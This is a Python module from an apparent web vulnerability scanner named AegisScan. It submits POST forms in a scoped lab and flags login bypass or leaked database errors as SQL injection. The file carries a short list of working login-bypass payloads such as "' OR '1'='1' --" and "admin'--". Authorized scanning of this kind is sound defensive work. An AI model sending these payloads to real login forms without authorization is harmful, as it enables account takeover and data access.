"""
detectors/sqli_detector.py -- AegisScan SQL Injection Detector
===============================================================
This module tests every HTML form found by the crawler for SQL Injection.

How it works:
  1. For each form, build a POST data dict using SQLi payloads as field values
  2. Send the request to the form's action URL
  3. Check the response for signs of SQLi success:
       a. Login bypass: page says "Logged in" or returns HTTP 200 with session
       b. SQL error:    response contains database error text

What it returns:
  A list of RawFinding dataclasses -- one per confirmed potential finding.
  These are passed to the validation module for confirmation.

IMPORTANT -- no destructive payloads:
  We only use read-only payloads (always-true conditions and UNION SELECT).
  Never DROP TABLE, DELETE, or UPDATE.
"""

import httpx
from dataclasses import dataclass
from typing import List
from discovery.crawler import DiscoveryResult, PageForm
from scope import ScopeGuard, OutOfScopeError


# ---------------------------------------------------------------------------
# SQL Injection payloads -- safe, read-only
# ---------------------------------------------------------------------------
#
# Payload 1: Classic always-true bypass
#   Makes the WHERE clause always true: WHERE username = '' OR '1'='1'
#   This causes most login forms to return the first row in the users table.
#
# Payload 2: Comment-based bypass
#   The -- comments out the rest of the query (password check).
#
SQLI_PAYLOADS = [
    "' OR '1'='1' --",      # always-true with comment (bypasses password check)
    "' OR 1=1 --",          # numeric always-true with comment
    "' OR '1'='1",          # always-true (if no trailing AND)
    "admin'--",             # comment out password check for known username
    "'",                    # probe for SQL error disclosure
]

# Phrases that indicate a SQL error was leaked in the response
SQL_ERROR_MARKERS = [
    "sqlite3.operationalerror",
    "syntax error",
    "database error:",
    "unrecognized token",
    "no such column",
]

# Phrases that indicate a login bypass succeeded.
# IMPORTANT: be specific — generic words like "welcome", "logout", "dashboard"
# can appear on ordinary pages (e.g. a homepage that shows "Welcome back!").
# Only use phrases that ONLY appear on a successful post-login response.
LOGIN_SUCCESS_MARKERS = [
    "logged in as",   # AegisLab's exact success string: "Logged in as: alice"
]


# ---------------------------------------------------------------------------
# Output dataclass
# ---------------------------------------------------------------------------

@dataclass
class RawFinding:
    """
    Represents a potential SQLi finding, before validation.

    Fields:
        form        -- the PageForm that was tested
        payload     -- the exact SQLi string that triggered the finding
        field_name  -- which input field the payload was injected into
        evidence    -- snippet of the response that showed vulnerability
        trigger     -- what kind of signal was detected ("bypass" or "error")
    """
    form: PageForm
    payload: str
    field_name: str
    evidence: str
    trigger: str     # "bypass" or "error"


# ---------------------------------------------------------------------------
# Detector
# ---------------------------------------------------------------------------

def detect(discovery: DiscoveryResult) -> List[RawFinding]:
    """
    Test all POST forms for SQL Injection.

    Args:
        discovery: DiscoveryResult from crawler.crawl()

    Returns:
        List of RawFinding -- one per (form, payload) combination that triggered.
        Empty list if no SQLi detected.
    """
    findings: List[RawFinding] = []

    # Only test forms that submit via POST
    # (GET forms could also be vulnerable but login forms use POST)
    post_forms = [f for f in discovery.all_forms if f.method == "POST"]

    if not post_forms:
        print("  [SQLi] No POST forms found -- nothing to test.")
        return findings

    print(f"  [SQLi] Found {len(post_forms)} POST form(s) to test.")

    guard = ScopeGuard()
    with guard.client() as client:

        for form in post_forms:
            print(f"  [SQLi] Testing form: {form.action}")

            # Build a list of fields we can inject into
            # (skip submit buttons and hidden fields -- focus on text/password)
            injectable_fields = [
                f for f in form.fields
                if f.field_type in ("text", "password", "search", "email")
            ]

            if not injectable_fields:
                print(f"  [SQLi]   No injectable fields in this form, skipping.")
                continue

            # Flag: we already found a vulnerability in this form -- stop testing it
            form_hit = False

            for payload in SQLI_PAYLOADS:
                if form_hit:
                    break

                for target_field in injectable_fields:
                    if form_hit:
                        break

                    # Build form data: inject payload into one field at a time
                    # Fill other fields with innocuous dummy values
                    form_data = {}
                    for field in form.fields:
                        if field.field_type == "submit":
                            continue   # skip submit buttons
                        if field.name == target_field.name:
                            form_data[field.name] = payload   # <-- inject here
                        else:
                            # Dummy value -- realistic enough to not cause errors
                            form_data[field.name] = "testvalue123"

                    # Send the POST request
                    try:
                        response = client.post(form.action, data=form_data)
                    except OutOfScopeError as e:
                        print(f"  [SQLi]   Scope violation, skipping: {e}")
                        form_hit = True   # don't keep trying this form
                        break
                    except Exception as e:
                        print(f"  [SQLi]   Request failed: {e}")
                        continue

                    response_lower = response.text.lower()

                    # ----------------------------------------------------------
                    # Check BOTH signal types simultaneously.
                    # Priority: bypass > error
                    # Rationale: AegisLab sometimes shows an SQL error AND a
                    # login success in the same response. We prefer "bypass"
                    # (Critical) when both are present, since bypass is the
                    # higher-severity signal.
                    # ----------------------------------------------------------
                    bypass_marker_hit = None
                    for marker in LOGIN_SUCCESS_MARKERS:
                        if marker in response_lower:
                            bypass_marker_hit = marker
                            break

                    error_marker_hit = None
                    for marker in SQL_ERROR_MARKERS:
                        if marker in response_lower:
                            error_marker_hit = marker
                            break

                    if bypass_marker_hit:
                        # Bypass is the highest-severity signal -- use it
                        evidence_snippet = _extract_snippet(response.text, bypass_marker_hit)
                        trigger = "bypass"
                        used_marker = bypass_marker_hit
                    elif error_marker_hit:
                        # SQL error disclosed -- also a confirmed injection point
                        evidence_snippet = _extract_snippet(response.text, error_marker_hit)
                        trigger = "error"
                        used_marker = error_marker_hit
                    else:
                        # No signal -- this payload did nothing
                        continue

                    finding = RawFinding(
                        form=form,
                        payload=payload,
                        field_name=target_field.name,
                        evidence=evidence_snippet,
                        trigger=trigger
                    )
                    findings.append(finding)
                    print(
                        f"  [SQLi]   FOUND {trigger}! field='{target_field.name}' "
                        f"payload='{payload}' marker='{used_marker}'"
                    )
                    # One finding per form is enough -- move on to the next form
                    form_hit = True

    if not findings:
        print("  [SQLi] No SQL Injection vulnerabilities detected.")

    return findings


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _extract_snippet(html: str, keyword: str, context: int = 200) -> str:
    """
    Find keyword in html (case-insensitive) and return a short surrounding
    snippet to use as evidence in the finding record.

    Args:
        html:    full response HTML
        keyword: the marker string to locate
        context: number of characters to return around the keyword

    Returns:
        A short evidence string (plain text, not HTML)
    """
    lower = html.lower()
    idx = lower.find(keyword)
    if idx == -1:
        return keyword  # fallback

    start = max(0, idx - context // 2)
    end = min(len(html), idx + len(keyword) + context // 2)
    snippet = html[start:end].strip()

    # Strip HTML tags for readability in the report
    from bs4 import BeautifulSoup
    clean = BeautifulSoup(snippet, "html.parser").get_text(separator=" ")
    return clean[:400]   # cap at 400 chars
